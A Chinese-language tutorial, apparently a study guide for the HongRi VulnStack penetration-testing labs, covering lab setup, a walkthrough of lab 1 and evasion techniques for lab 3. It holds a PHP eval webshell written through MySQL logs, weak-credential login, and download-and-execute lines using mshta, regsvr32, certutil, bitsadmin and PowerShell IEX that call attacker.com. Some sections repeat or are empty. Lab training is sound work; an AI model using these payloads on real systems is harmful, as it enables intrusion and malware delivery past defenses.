## 三、靶场环境搭建方法

- 7-Zip 或 WinRAR（解压镜像）
- Kali Linux 攻击机（自行安装）

**推荐配置**：
| 配置项 | 最低要求 | 推荐配置 |
|--------|----------|----------|
| 内存 | 8GB | 16GB+ |
| CPU | 4核 | 8核+ |
| 硬盘 | 50GB | 100GB SSD |
| 系统 | Windows 10 / Linux | Windows 11 / Kali Linux |

### 3.2 镜像下载

**官方渠道**：
- 红日安全官网：https://www.hongrisec.com/
- 红日安全GitHub：https://github.com/78778443/
- 微信公众号：红日安全

**注意事项**：
1. 请从官方渠道下载，避免植入后门的第三方镜像
2. 镜像文件较大（通常几个GB），请耐心下载
3. 下载完成后建议校验MD5/SHA值

### 3.3 详细搭建步骤

**步骤1：解压镜像文件**

```bash
# 检查文件完整性
md5sum vulnstack1.7z

# 解压（Linux）
7z x vulnstack1.7z -o /opt/vulnstack1/

# 解压（Windows）
# 右键 → 7-Zip → 提取到 vulnstack1\
```

**步骤2：导入虚拟机**

VMware导入方法：
```
1. 打开VMware Workstation
2. 文件 → 打开 → 选择解压目录中的 .vmx 文件
3. 弹出"虚拟机已移动/复制"对话框，选择"我已移动该虚拟机"
4. 等待虚拟机加载完成
5. 重复以上步骤导入所有虚拟机
```

VirtualBox导入方法：
```
1. 打开VirtualBox
2. 管理 → 导入虚拟电脑
3. 选择 .ova 文件（如有）
4. 或选择 .vmdk 文件创建新虚拟机
5. 调整配置后完成导入
```

**步骤3：配置虚拟网络**

```
VMware网络配置：
1. 编辑 → 虚拟网络编辑器
2. 添加网络 → VMnet1 → 仅主机模式
3. 子网IP：192.168.1.0
4. 子网掩码：255.255.255.0
5. 取消勾选"使用本地DHCP服务"
6. 点击"应用"保存
```

**步骤4：配置各虚拟机网卡**

| 虚拟机 | 网卡 | 网络模式 | 说明 |
|--------|------|----------|------|
| Kali攻击机 | 网卡1 | NAT | 用于上网和下载工具 |
| Kali攻击机 | 网卡2 | VMnet1 | 用于攻击内网 |
| Web服务器 | 网卡1 | VMnet1 | 外网边界服务器 |
| 域成员机 | 网卡1 | VMnet1 | 内网域内主机 |
| 域控DC | 网卡1 | VMnet1 | 域控制器 |

**步骤5：启动验证**

```bash
# 在Kali中配置内网网卡IP
ip addr add 192.168.1.50/24 dev eth1
ip link set eth1 up

# 测试连通性
ping 192.168.1.100 -c 3
```

## 四、红日靶场1详细攻略

红日靶场1（VulnStack 1）是内网渗透入门的经典之作。本节从红日团队的教学理念出发，讲解系统化的渗透思路。

### 4.1 红日教学理念

红日安全团队强调"思路优先，工具为辅"的学习方法：

1. **先思考，后动手**：先分析可能的攻击路径，再用工具验证
2. **注重原理，不只是工具**：理解漏洞原理，而不是只会用工具
3. **多路径思维**：一个目标尝试多种攻击方法
4. **复盘总结**：每做完一个靶场，写出详细的渗透报告

### 4.2 环境信息

**靶场拓扑**：
```
Kali攻击机 (192.168.1.50)
    |
    |---- Web服务器 (192.168.1.100) - 边界服务器
    |         |
    |         |---- 域成员机 (192.168.1.x)
    |         |
    |         +---- 域控 (192.168.1.x) - god.org
    |
   内网 192.168.1.0/24
```

**已知信息**：
- 边界服务器IP：192.168.1.100
- 内网网段：192.168.1.0/24
- 域名：god.org
- 目标：拿下域控权限

### 4.3 第一阶段：外网打点

**红日方法论：信息收集先行**

**步骤1：全面端口扫描**

```bash
# 全端口扫描，不放过任何一个端口
nmap -p- -sV -sC -O --open 192.168.1.100 -oN web_full_scan.txt

# 常见漏洞扫描脚本
nmap --script vuln -p 80,3306,445 192.168.1.100
```

**步骤2：Web应用侦察**

```bash
# 指纹识别
whatweb -v http://192.168.1.100

# 目录扫描（多工具交叉验证）
dirsearch -u http://192.168.1.100 -e php,txt,html,zip,bak,sql
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

# 备份文件扫描
python3 backup-scan.py http://192.168.1.100
```

**步骤3：漏洞发现与利用**

发现phpMyAdmin后，利用弱口令进入：
```
http://192.168.1.100/phpmyadmin/
root / root
```

**步骤4：GetShell的多种方式**

方式一：日志写Shell
```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'C:/phpStudy/WWW/cmd.php';
SELECT '<?php @eval($_POST["hongri"]);?>';
```

方式二：慢查询日志写Shell

方式三：INTO OUTFILE（需要知道物理路径）
```sql

```

### 4.4 第二阶段：权限提升

**红日教学要点：提权先收集信息**


## 六、红日靶场3详细攻略

### 6.1 靶场特点

红日靶场3引入了安全防护机制，重点考察绕过能力：
- 模拟杀毒软件环境
- 需要免杀技术
- 考察白名单利用
- 无文件攻击技术

### 6.2 关键技术点

**白名单利用**：

> 💡 **大白话说免杀与绕过——"你不是在躲监控，你是在借用别人的身份"**
>
> 红日靶场3的核心是"绕过安全防护"。你不再像靶场1那样用现成的Mimikatz大摇大摆地跑，而是要学会"伪装"。用电影里的特工来比喻：
>
> **免杀 = 伪装身份**
> - 普通的Mimikatz就像一个穿着"我是黑客"T恤的人走进大楼——杀毒软件一眼就认出来了
> - 免杀的做法是给它换一套"修空调的工服"（加密/混淆Shellcode），混在人群中不被注意
>
> **白名单利用 = 借用别人的证件**
> - Windows系统自带了很多合法程序：mshta.exe、rundll32.exe、regsvr32.exe、certutil.exe
> - 这些程序就像大楼的"内部员工"——保安（杀毒软件）对它们天然信任
> - 攻击者就是**让这些"内部员工"帮自己办事**：让mshta.exe去下载恶意脚本、让certutil.exe去下载病毒文件
> - 因为这本身是mshta.exe在执行，杀毒软件会以为是合法的系统行为
>
> **无文件攻击 = 不在大楼里留任何痕迹**
> - 传统攻击：把病毒文件写到硬盘 → 被扫描发现 → 你暴露了
> - 无文件攻击：代码只在内存中运行，不落地任何文件 → 关机重启后，所有痕迹消失
> - PowerShell、WMI、注册表都是常见的无文件攻击载体
>
> 红日靶场3让你从"明火执仗"的打法转向"潜伏渗透"的打法——这恰恰是真实红队工作的核心能力。

**白名单利用**：
```bash
# mshta.exe 执行HTML应用
mshta http://attacker.com/payload.hta

# rundll32.exe 执行DLL
rundll32.exe payload.dll,EntryPoint

# regsvr32.exe 执行SCT
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# certutil.exe 下载文件
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

# bitsadmin.exe 下载文件
bitsadmin /transfer job /download /priority normal http://attacker.com/payload.exe C:\temp\payload.exe
```

**PowerShell无文件攻击**：
```powershell
# PowerShell下载执行
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# 混淆PowerShell
# 使用 Invoke-Obfuscation 进行混淆
```

**免杀技术**：
- 加密Shellcode
- 分离免杀
- 加壳保护
- 签名伪造

### 6.3 攻略要点

1. 外网打点时注意绕过WAF
2. WebShell使用加密/混淆版本
3. 内存马技术
4. 绕过EDR执行代码
5. 无文件横向移动

## 七、红日靶场学习路线

### 7.1 学习阶段划分

### 7.1 学习阶段划分

> 💡 **大白话说内网渗透学习路径——"从新兵到特种兵的四步走"**
>
> 红日靶场的学习阶段设计非常科学，其实是在模拟一个"从新兵到特种兵"的成长过程：
>
> **阶段一：新兵营（基础准备，1-2周）**
> - 学姿势：Web安全基础、操作系统基础、网络基础
> - 练体能：至少能用Python写脚本，能用PowerShell执行命令
> - 目标：**进了内网不会手足无措**
> - 检验标准：能独立完成DVWA的Low难度全部通关
>
> **阶段二：列兵（红日靶场1，2-3周，三遍）**
> - 第一次实战：phpMyAdmin弱口令 → WebShell → 信息收集 → Mimikatz凭据 → 横向移动 → 域控
> - 第一次感受"完整攻击链"的快感
> - 目标：**建立对内网渗透全流程的直观感受**
> - 检验标准：独立完成靶场1第二遍，记住全部关键步骤
>
> **阶段三：士官（红日靶场2+3，各2-3周）**
> - 搞定多网段渗透（代理转发）
> - 搞定免杀绕过（无文件攻击、白名单利用）
> - 目标：**能应对"不那么顺利"的实战场景**
> - 检验标准：能自己搭建代理去访问第二网段，能用白名单程序下载执行代码
>

### 7.2 学习方法

**红日安全推荐学习法**：

> 💡 **大白话说红日的"三遍学习法"——"模仿、复述、创新"**
>
> 红日安全团队最经典的学习方法论就是"三遍学习法"，这其实比任何具体的技术讲解都更有价值。用学做菜来类比：
>
> **第一遍：跟着菜谱做（照猫画虎）**
> - 你完全跟着Writeup（菜谱）走，一步一步复制命令
> - 目标不是"看懂"，而是 **"让手记住"** ——熟悉工具命令、熟悉流程节奏、感受整个攻击链的长度
> - 这一遍你可能会觉得"我只是在抄答案"，但其实你已经在建立**肌肉记忆**了
> - 就像第一次做菜，你把"盐少许、生抽一勺"全部照着放，做完自己尝尝就知道了什么是正常味道
>
> **第二遍：不看菜谱，凭记忆做（独立复现）**
> - 关掉Writeup，自己从头打一遍
> - 卡住了才知道"哦，原来这一步我上次是抄的，没真正理解为什么这么做"
> - 这一遍的核心是**把"知道怎么做"变成"理解为什么这么做"**
> - 你会开始思考：为什么这里用这个工具而不是那个？为什么先做信息收集而不是直接打漏洞？
>
> **第三遍：自己改菜谱（创新尝试）**
> - 尝试不同的攻击路径：有没有别的方法拿到Shell？能不能绕过某一步？
> - 思考优化：能不能用更少的步骤达到同样的效果？用自动化脚本替代手动操作？
> - 这一遍的目标是**从"会做题"变成"会出题"** ——你开始具备红队思维
>
> **为什么三遍比一遍有效得多？** 因为大脑的学习机制不是"听一次就会"，而是"理解→实践→犯错→反思→重新实践"。三遍学习法恰恰利用了人类最容易犯的错误（过目即忘、眼高手低），用刻意重复来对抗遗忘。

**红日安全推荐学习法**：

1. **三遍学习法**
   - 第一遍：跟着Writeup走，理解每个步骤
   - 第二遍：不看Writeup，自己独立完成
   - 第三遍：思考优化方案，尝试不同路径

2. **思维导图法**
   - 每学完一个靶场，整理一张思维导图
   - 记录漏洞点、攻击路径、工具使用
   - 定期回顾更新

3. **写作输出法**
   - 每做完一个靶场写一篇详细的Writeup
   - 记录遇到的问题和解决方案
   - 分享到社区获得反馈

4. **模拟实战法**
   - 设定时间限制（如8小时内完成）
   - 模拟真实渗透测试环境
   - 输出正式的渗透测试报告

### 9.3 工具学习建议

> 💡 **大白话说工具学习——"不是攒武器库，是练兵器功夫"**
>
> 很多初学者有一个误区：拼命下载各种工具，好像工具越多越厉害。但实际上，**工具就像武器，你不会用的武器反而是累赘**。

>
> | 类别 | 核心工具 | 对应武侠比喻 | 为什么选它 |

> | 信息收集 | fscan + BloodHound | 侦察兵 | fscan一键扫描内网，BloodHound画攻击路径地图 |

> | 代理转发 | frp | 隧道工 | 把内网流量引出外网，多层内网必备 |

> **一个实用的建议**：先把这5个类别各精通1个工具，再去了解其他工具。先会用fscan再做信息收集，先会用Mimikatz再提凭据。信息收集、凭据、横向、域攻击、代理——这五步走通了，内网渗透的核心流程你就掌握了。
